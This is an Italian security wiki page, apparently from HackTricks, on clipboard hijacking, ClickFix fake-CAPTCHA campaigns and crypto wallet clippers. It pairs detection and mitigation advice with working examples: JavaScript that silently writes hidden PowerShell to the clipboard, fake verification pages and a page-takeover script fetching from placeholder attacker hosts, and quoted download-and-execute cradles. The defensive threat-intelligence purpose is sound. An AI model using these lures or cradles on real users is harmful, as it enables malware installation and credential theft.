# Attacchi di Clipboard Hijacking (Pastejacking)

> "Non incollare mai nulla che non hai copiato tu stesso." – un consiglio vecchio, ma ancora valido

## Panoramica

Il Clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano abitualmente comandi senza controllarli. Una pagina web dannosa (o qualsiasi contesto compatibile con JavaScript, come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime vengono incoraggiate, normalmente tramite istruzioni di social engineering attentamente create, a premere **Win + R** (finestra Esegui), **Win + X** (Accesso rapido / PowerShell), oppure ad aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **non viene scaricato alcun file e non viene aperto alcun allegato**, la tecnica elude la maggior parte dei controlli di sicurezza per e-mail e contenuti web che monitorano allegati, macro o l'esecuzione diretta di comandi. L'attacco è quindi diffuso nelle campagne di phishing che distribuiscono famiglie di malware comuni come NetSupport RAT, Latrodectus loader o Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper per la sostituzione degli indirizzi wallet

Un'altra variante del **clipboard hijacking** non incolla affatto comandi: attende che la vittima copi un **indirizzo di wallet cryptocurrency**, quindi lo sostituisce silenziosamente con uno controllato dall'attaccante subito prima dell'incolla. Questo è particolarmente efficace con i formati di wallet lunghi, perché gli utenti verificano spesso solo i primi e gli ultimi caratteri.<sup>[[8]](#references)</sup>

Tratti comuni osservati nel mondo reale:
- **Thin loader + nested payload**: l'app/exe visibile sembra uno strumento legittimo per il trading o per ottenere "profitto", mentre il clipper reale è nascosto più in profondità nel bundle (ad esempio un loader .NET che avvia un payload Rust annidato).
- **Sostituzione basata su regex**: il malware individua stringhe come `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` o persino stringhe generiche simili a quelle di Solana di **44 caratteri**, e le riscrive sostituendole con wallet controllati dall'attaccante.
- **Rotazione dei wallet su larga scala**: i sample moderni per Windows possono incorporare **migliaia** di wallet sostitutivi per valuta invece di un singolo indirizzo statico, riducendo il danno alla reputazione del wallet dopo ogni furto.<sup>[[8]](#references)</sup>

### Flusso di un clipper su Windows

Un'implementazione comune consiste in una finestra nascosta registrata con **`AddClipboardFormatListener`**. A ogni aggiornamento degli appunti, il malware esegue generalmente queste operazioni:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accede ai dati correnti degli appunti.
- **`GetClipboardData`** → legge il testo.
- **`EmptyClipboard`** + **`SetClipboardData`** → sostituisce la stringa del wallet con il valore dell'attaccante.

Regex minime per l'hunting frequentemente osservate nei clipper:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistenza a livello utente è sufficiente per ottenere un impatto. Un pattern osservato è:<sup>[[8]](#references)</sup>
- Copiare il payload in **`%APPDATA%\silke\silke.exe`**
- Creare un **LNK nella cartella Startup** in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idee per il rilevamento:
- Processi che chiamano continuamente le API della clipboard e contemporaneamente scrivono in `%APPDATA%` e nella cartella **Startup** dell'utente.
- Creazione di nuovi LNK/eseguibili seguita da riscritture della clipboard degli indirizzi dei wallet.
- Archivi o bundle di fake software contenenti molti file inutilizzati e un piccolo launcher che avvia un binary annidato.

### Rimozione della quarantena tramite social engineering su macOS + persistenza tramite LaunchAgent

Su macOS, alcune campagne distribuiscono un helper **`unlocker.command`** e istruiscono la vittima a fare clic con il tasto destro → **Open** se Gatekeeper segnala che l'app è danneggiata o proviene da uno sviluppatore non identificato. Lo script rimuove semplicemente la quarantena e avvia il file `.app` vicino:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Questo **non** è un exploit di Gatekeeper; è un **bypass della quarantine tramite social engineering** che sfrutta il fatto che le decisioni di Gatekeeper dipendono dall'xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Dopo l'esecuzione, il clipper può mantenere la persistenza per l'utente corrente scrivendo:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` e `KeepAlive`

Un dettaglio utile per la difesa è che alcuni sample implementano un **watchdog self-healing** che riscrive il LaunchAgent e il wrapper ogni ~30 secondi. Se rimuovi prima il plist **senza terminare il processo in esecuzione**, il malware potrebbe ricrearlo immediatamente.<sup>[[8]](#references)</sup> Ordine sicuro per la pulizia:
1. Termina il processo attivo del clipper.
2. Scarica/elimina il plist del LaunchAgent.
3. Elimina `~/launch.sh` e il payload copiato.

### Nota sulla distribuzione: la reputazione falsa come moltiplicatore di efficacia

Per questa famiglia, il malware può rimanere tecnicamente semplice mentre è il **livello di distribuzione** a svolgere il lavoro pesante: fake star/fork su GitHub, recensioni/download su SourceForge, commenti/visualizzazioni di tutorial su YouTube e commenti/voti dall'aspetto benigno su VirusTotal vengono utilizzati per far apparire il binary affidabile prima dell'esecuzione.<sup>[[8]](#references)</sup>

## Pulsanti di copia forzata e payload nascosti (one-liner macOS)

Alcuni infostealer per macOS clonano i siti degli installer (ad es., Homebrew) e **forzano l'uso di un pulsante “Copy”** in modo che gli utenti non possano evidenziare solo il testo visibile. La voce della clipboard contiene il comando dell'installer previsto più un payload Base64 aggiunto (ad es., `...; echo <b64> | base64 -d | sh`), quindi un singolo paste esegue entrambi mentre l'interfaccia nasconde lo stage aggiuntivo.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne più vecchie usavano `document.execCommand('copy')`, mentre quelle più recenti si basano sull’**Clipboard API** asincrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Il flusso ClickFix / ClearFake

1. L’utente visita un sito typosquatted o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript **ClearFake** iniettato chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente negli appunti una one-liner PowerShell codificata in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito e scarica un archivio contenente un eseguibile legittimo e una DLL malevola (il classico DLL sideloading).
5. Il loader decritta ulteriori stage, inietta shellcode e installa la persistenza (ad es. un’attività pianificata), eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca `msvcp140.dll` nella propria directory.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decritta utilizzando una chiave XOR a rotazione `"https://google.com/"`, inietta lo shellcode finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript all'interno di **cscript.exe**
3. Recupera un payload MSI → deposita `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e la concatenazione di file, quindi esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con C2 rotante (PureHVNC)

Alcune campagne ClickFix omettono completamente i download di file e istruiscono le vittime a incollare un one-liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 quotidianamente. Catena osservata di esempio:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato invertito a runtime per eludere un'ispezione superficiale.
- JavaScript si mantiene tramite uno Startup LNK (WScript/CScript) e seleziona il C2 in base al giorno corrente, consentendo una rapida rotazione dei domini.<sup>[[3]](#references)</sup>

Frammento JS minimale utilizzato per ruotare i C2 in base alla data:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva implementa comunemente un loader che stabilisce la persistenza e scarica un RAT (ad es., PureHVNC), spesso usando il pinning TLS con un certificato hardcoded e suddividendo il traffico in chunk.<sup>[[3]](#references)</sup>

Idee di rilevamento specifiche per questa variante
- Albero dei processi: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oppure `cscript.exe`).
- Artefatti di avvio: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Telemetria del Registry/RunMRU e delle command line contenente `.split('').reverse().join('')` oppure `eval(a.responseText)`.
- Esecuzioni ripetute di `powershell -NoProfile -NonInteractive -Command -` con payload estesi via stdin per fornire script lunghi senza command line lunghe.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/percorso dall’aspetto riconducibile a un updater (ad es., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 a rotazione giornaliera con il pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare gli eventi di scrittura negli appunti, seguiti dall’incolla tramite Win+R e dall’esecuzione immediata di `powershell.exe`.

I blue-team possono combinare la telemetria degli appunti, della creazione dei processi e del Registry per individuare con precisione gli abusi di pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva la cronologia dei comandi **Win + R**: cercare voci Base64 insolite o offuscate.
* Security Event ID **4688** (Process Creation) in cui `ParentImage` == `explorer.exe` e `NewProcessName` appartiene a { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per la creazione di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o nelle cartelle temporanee subito prima dell’evento 4688 sospetto.
* Sensori EDR per gli appunti (se disponibili): correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## Pagine di verifica in stile IUAM (ClickFix Generator): copia negli appunti verso la console + payload OS-aware

Campagne recenti producono in massa false pagine di verifica CDN/browser ("Just a moment…", in stile IUAM) che inducono gli utenti a copiare comandi specifici per il sistema operativo dagli appunti nelle console native. In questo modo l’esecuzione viene spostata al di fuori della sandbox del browser e il metodo funziona su Windows e macOS.<sup>[[4]](#references)</sup>

Caratteristiche principali delle pagine generate dal builder
- Rilevamento dell’OS tramite `navigator.userAgent` per personalizzare i payload (Windows PowerShell/CMD rispetto a macOS Terminal). Decoy/no-op opzionali per gli OS non supportati, così da mantenere l’illusione.
- Copia automatica negli appunti tramite azioni UI innocue (checkbox/Copy), mentre il testo visibile può differire dal contenuto degli appunti.
- Blocco dei dispositivi mobili e popover con istruzioni passo passo: Windows → Win+R→incolla→Enter; macOS → apri Terminal→incolla→Enter.
- Offuscamento opzionale e injector single-file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non è necessaria la registrazione di un nuovo dominio).<sup>[[4]](#references)</sup>

Esempio: mismatch degli appunti + branching OS-aware
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistenza macOS dell'esecuzione iniziale
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminal, riducendo gli artefatti visibili.<sup>[[4]](#references)</sup>

In-place page takeover su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Idee specifiche per il rilevamento e la ricerca di lures in stile IUAM
- Web: Pagine che associano la Clipboard API a widget di verifica; discrepanza tra il testo visualizzato e il payload degli appunti; branching di `navigator.userAgent`; Tailwind + sostituzione single-page in contesti sospetti.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un'interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- Endpoint macOS: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; background job che sopravvivono alla chiusura del terminale.
- Correlare la cronologia `RunMRU` di Win+R e le scritture negli appunti con la successiva creazione di processi console.

Vedi anche per le tecniche di supporto

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluzioni di fake CAPTCHA / ClickFix del 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare loader JavaScript che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain di “etherhiding” (ad esempio POST verso endpoint API della Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica corrente delle lures. Gli overlay recenti utilizzano ampiamente fake CAPTCHA che istruiscono gli utenti a copiare/incollare un one-liner (T1204.004) invece di scaricare qualcosa.<sup>[[6]](#references)</sup>
- L'esecuzione iniziale viene sempre più delegata a signed script hosts/LOLBAS. Le catene di gennaio 2026 hanno sostituito il precedente uso di `mshta` con `SyncAppvPublishingServer.vbs`, integrato nel sistema ed eseguito tramite `WScript.exe`, passando argomenti simili a PowerShell con alias/wildcard per recuperare contenuti remoti:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente utilizzato da App-V; abbinato a `WScript.exe` e ad argomenti insoliti (alias `gal`/`gcm`, cmdlet con wildcard, URL jsDelivr), diventa uno stage LOLBAS ad alto segnale per ClearFake.<sup>[[6]](#references)</sup>
- A febbraio 2026, i payload di CAPTCHA falsi sono tornati ai puri download cradles PowerShell. Due esempi live:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima chain è un grabber `iex(irm ...)` in-memory; la seconda usa `WinHttp.WinHttpRequest.5.1`, scrive un file `.ps1` temporaneo e poi lo avvia con `-ep bypass` in una finestra nascosta.<sup>[[6]](#references)</sup>

Suggerimenti per il rilevamento e la ricerca di queste varianti
- Lineage dei processi: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oppure PowerShell cradle subito dopo scritture negli appunti/Win+R.
- Parole chiave nella riga di comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domini jsDelivr/GitHub/Cloudflare Worker oppure pattern `iex(irm ...)` con IP grezzi.
- Rete: connessioni in uscita verso host CDN worker o endpoint RPC blockchain da script host/PowerShell subito dopo la navigazione web.
- File/registro: creazione di `.ps1` temporanei in `%TEMP%` insieme a voci RunMRU contenenti questi one-liner; bloccare o generare alert quando LOLBAS per script firmati (WScript/cscript/mshta) viene eseguito con URL esterni o stringhe alias offuscate.

## Tecniche ClickFix di giugno 2026: telemetria degli incolla, commenti di verifica falsi e concatenamento di LOLBin

La telemetria recente di Red Canary mostra che l'indicatore stabile **non è un comando esatto**, ma la combinazione di **incolla-e-avvia assistito dall'utente**, **interpreti affidabili/LOLBins**, **flag offuscati**, **recupero remoto** ed **esecuzione immediata**.<sup>[[7]](#references)</sup>

### Pattern rilevanti degli operatori

- **Telemetria della conferma dell'incolla**: alcuni payload chiamano `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` prima dello stage reale. Ciò conferma l'interazione dell'utente mantenendo la finestra breve e silenziosa.
- **Commenti di verifica falsi**: i one-liner PowerShell possono aggiungere stringhe come `# Security check ✔️ I'm not a robot Verification ID: 138105`, così il comando mantiene un aspetto correlato a un CAPTCHA dopo essere stato incollato in Run / `cmd.exe` / nella cronologia di PowerShell.
- **Ricostruzione dinamica dell'URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita un URL statico nella riga di comando pur eseguendo comunque il download-and-execute in-memory.
- **Esecuzione di un installer mascherato**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` sfrutta maiuscole e minuscole insolite e caratteri simili a Unicode nei flag per eludere i rilevamenti fragili, pur assomigliando ancora a `msiexec.exe`.
- **Chain di LOLBin con escape tramite caret**: `cmd.exe` può nascondere le parole chiave usando escape `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), avviare la shell annidata minimizzata, salvare il contenuto dell'attaccante con un'estensione innocua come `.pdf` e poi eseguirlo tramite `mshta`.<sup>[[7]](#references)</sup>
## Mitigazioni

1. Hardening del browser – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) oppure richiedere un gesto dell'utente.
2. Consapevolezza sulla sicurezza – insegnare agli utenti a *digitare* i comandi sensibili o a incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare one-liner arbitrari.
4. Controlli di rete – bloccare le richieste in uscita verso domini noti di pastejacking e malware C2.

## Trick correlati

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver attirato gli utenti in un server malevolo:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Correggere il clic: prevenire il vettore di attacco ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC di Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: dal RAT al Builder al Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La fabbrica di ClickFix: prima esposizione del generatore IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [Il 2025, l'anno dell'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Approfondimenti di intelligence: febbraio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Approfondimenti di intelligence: giugno 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Dalle stelle agli upvote: la reputazione falsa alimenta un crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
